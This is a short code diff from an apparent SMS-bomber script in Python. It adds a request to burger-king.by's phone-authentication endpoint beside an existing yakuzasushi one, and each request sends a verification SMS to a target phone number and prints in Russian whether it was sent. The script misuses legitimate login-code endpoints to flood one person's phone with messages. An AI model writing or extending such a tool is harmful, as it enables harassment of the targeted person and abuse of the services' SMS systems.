@@ -117,3 +117,15 @@ if response.status_code == 200:
     print("Смс от yakuzasushi отправлено!")
 else:
     print("Смс от yakuzasushi не отправлено!")
+    
+headers1 = {
+    "user-agent": user,
+    "Accept": "*/*",
+    "device-uuid": "f83a6b92-7ccb-4f99-9211-47c557bb25f4"
+    }
+
+response = requests.post('https://burger-king.by/api/v1/web/auth/phone', json={"phoneNumber":f"{phone}","clientRequestType":"website"}, headers=headers1)
+if response.status_code == 200:
+    print("Смс от burger-king отправлено!")
+else:
+    print("Смс от burger-king не отправлено!")
